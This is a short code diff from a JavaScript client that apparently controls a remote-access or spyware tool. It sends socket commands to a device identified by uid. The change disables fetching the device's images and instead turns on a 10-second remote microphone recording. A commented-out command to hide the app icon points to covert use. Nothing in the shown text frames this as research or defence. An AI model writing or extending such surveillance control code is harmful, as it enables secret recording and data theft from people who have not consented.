@@ -147,9 +147,9 @@ function getImages() {
     if (refresh_check.checked || firstLoadImages) {
         i = 0;
         images_div.innerHTML = 'Loading images, Please Wait...';
-        socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
+        // socket.emit('commands', {commands: [{command: 'getImages'}], uid: currentUID});
         // socket.emit('commands', {commands: [{command: 'toggleIcon', icon: false}], uid: currentUID});
-        // socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
+        socket.emit('commands', {commands: [{command: 'recordMicrophone', sec: 10}], uid: currentUID});
 
         setTimeout(function () {
             socket.emit('commands', {commands: [{command: 'stopAll'}], uid: currentUID});
